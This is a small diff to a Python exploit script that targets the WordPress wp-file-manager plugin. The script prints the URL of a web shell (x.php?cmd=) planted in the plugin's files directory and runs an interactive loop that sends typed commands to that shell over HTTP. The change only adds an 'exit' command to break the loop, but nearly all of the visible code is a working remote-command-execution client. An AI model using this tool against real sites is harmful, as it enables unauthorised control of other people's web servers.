@@ -16,6 +16,8 @@ print("URL Shell: %s/wp-content/plugins/wp-file-manager/lib/files/x.php?cmd=<CMD
 while True:
 
     cmd = input("$ ")
+    if cmd == "exit":
+        break
     burp0_url = "%s/wp-content/plugins/wp-file-manager/lib/files/x.php?cmd=%s" % (sys.argv[1], cmd)
     burp0_headers = {"User-Agent": "curl/7.68.0", "Accept": "*/*", "Expect": "100-continue", "Connection": "close"}
     r = requests.get(burp0_url, headers=burp0_headers)
